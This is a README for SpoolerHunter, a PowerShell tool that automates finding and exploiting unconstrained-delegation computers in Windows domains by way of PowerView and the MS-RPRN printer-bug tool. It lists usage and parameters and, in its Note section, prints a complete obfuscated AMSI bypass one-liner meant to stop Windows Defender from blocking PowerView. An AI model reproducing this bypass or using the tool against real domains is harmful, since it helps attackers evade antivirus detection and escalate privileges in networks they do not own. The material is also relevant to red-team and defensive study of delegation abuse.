# SpoolerHunter

<h3>Description:</h3>
SpoolerHunter is a PowerShell script designed to automate the detection and exploitation of unconstrained delegation computers in a domain environment. The script utilizes the PowerView module to identify vulnerable machines and exploits them using the MS-RPRN.exe tool. It provides options to specify a target machine for the scan and enable verbose output for detailed information during execution.
<h3>Usage:</h3>
<div style="background-color: #f5f5f5; /* Light gray background */
            border: 1px solid #ccc; /* Gray border */
            border-radius: 5px; /* Rounded corners */
            padding: 10px; /* Padding around the content */
            margin-bottom: 20px; /* Margin at the bottom */
            color:red;
            font-family: Arial, sans-serif; /* Font family */
            font-size: 14px; /* Font size */
            line-height: 1.5; /* Line height */
            overflow-x: auto; /* Enable horizontal scrolling if needed */">
    <pre><code>.\SpoolerHunter.ps1 [-TargetMachine [String]] [-Verbose] [-h]</code></pre>
</div>
<h3>Parameters:</h3><br/>
<ul>
	<li>
		<b>-TargetMachine [String]</b>: Specifies the machine which is allowed to delegate. If not provided, the script scans for unconstrained delegation computers in the domain.		
	</li>
	<li>
		<b>-Verbose</b>: Enables verbose output, displaying detailed information about the scan and exploitation process.
	</li>
	<li>
		<b>-h</b>: Displays the help message, providing information about the script's usage, parameters, and examples.
	</li>
</ul>

![_proofofconcept](https://github.com/IBarrous/SpoolerHunter/assets/126162952/1633125a-f1cc-4c91-a21e-2dd6983fb635)

<h3>Note:</h3>
<p>use the following AMSI bypass if PowerView is getting blocked by windows defender.</p>
<pre><code>S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )</code></pre>
<h3>Resources:</h3>
<ul>
	<li><a href="https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1"><b>PowerView</b></a></li>
	<li><a href="https://github.com/leechristensen/SpoolSample"><b>MS-RPRN</b></a></li>
</ul>
